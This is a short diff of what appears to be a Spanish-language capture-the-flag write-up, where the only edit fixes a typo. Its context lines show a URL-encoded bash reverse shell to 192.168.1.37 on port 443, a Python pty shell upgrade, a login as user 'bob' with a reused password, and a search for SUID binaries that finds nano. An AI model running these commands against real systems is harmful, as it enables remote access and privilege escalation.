@@ -87,7 +87,7 @@ bash -c "bash -i >%26 /dev/tcp/192.168.1.37/443 0>%261"
 
 le metemos el comando: python3 -c 'import pty;pty.spawn("/bin/bash")' y a por el ruteo,
 
-nos metemos en el usuario bob ocn la misma contraseña -> star, sudo -l no funcion, vamos a comprobar los permisos SUID, encontramos que esta nano:
+nos metemos en el usuario bob con la misma contraseña -> star, sudo -l no funcion, vamos a comprobar los permisos SUID, encontramos que esta nano:
 
 Entonces con nano lo que se puede hacer es:
 
